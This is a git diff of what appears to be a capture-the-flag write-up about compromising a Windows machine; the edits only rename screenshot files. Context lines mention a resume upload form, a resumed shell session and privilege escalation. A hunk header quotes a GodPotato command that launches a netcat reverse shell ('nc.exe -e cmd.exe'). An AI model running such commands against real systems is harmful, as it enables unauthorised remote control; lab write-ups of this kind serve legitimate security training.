@@ -18,7 +18,7 @@ PORT   STATE SERVICE
 
 The HTTP site was a Lorem Ipsum website:
 
-<figure><img src="../../../.gitbook/assets/image (185).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (185) (3).png" alt=""><figcaption></figcaption></figure>
 
 If we scroll down, we can see that there is a file upload for our 'resume'.
 
@@ -84,7 +84,7 @@ Active sessions
 
 Resume this sesison to drop into our shell:
 
-<figure><img src="../../../.gitbook/assets/image (268).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (268) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
@@ -170,6 +170,6 @@ C:\Windows\Tasks>.\godpotato.exe -cmd "cmd /c C:\Windows\Tasks\nc.exe -e cmd.exe
 ```
 {% endcode %}
 
-<figure><img src="../../../.gitbook/assets/image (174).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (174) (5).png" alt=""><figcaption></figcaption></figure>
 
 Rooted!
